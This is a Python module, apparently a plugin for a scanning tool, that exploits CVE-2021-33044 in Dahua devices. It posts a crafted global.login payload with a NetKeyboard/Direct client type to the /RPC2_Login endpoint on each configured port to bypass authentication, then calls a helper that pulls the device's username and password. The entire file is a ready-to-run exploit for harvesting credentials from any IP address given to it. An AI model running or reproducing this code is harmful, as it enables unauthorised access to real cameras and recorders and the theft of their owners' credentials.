"""CVE-2021-33044 — Dahua NetKeyboard Direct bypass → extract credentials."""
import requests

from .base import DEFAULT_PORTS, http_extract_credentials, USER_AGENT

NAME = "CVE-2021-33044"
PORTS = DEFAULT_PORTS
TIMEOUT = 10

HEADERS = {
    'User-Agent': USER_AGENT,
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Connection': 'close',
}

BYPASS_JSON = {
    "method": "global.login",
    "params": {
        "userName": "admin",
        "password": "Not Used",
        "clientType": "NetKeyboard",
        "loginType": "Direct",
        "authorityType": "Default",
        "passwordType": "Default",
    },
    "id": 1,
    "session": 0,
}


def check(ip, timeout=TIMEOUT):
    """Returns (user, password, name) or (None, None, None)."""
    for port in PORTS:
        try:
            url = f"http://{ip}:{port}/RPC2_Login"
            r = requests.post(url, headers=HEADERS, json=BYPASS_JSON,
                              verify=False, timeout=timeout)
            if r.status_code != 200:
                continue
            data = r.json()
            if data.get('result') is not True:
                continue

            session_id = data.get('session', '')
            user, password = http_extract_credentials(ip, port, timeout=timeout)
            if password:
                return user, password, NAME
        except Exception:
            pass
    return None, None, None
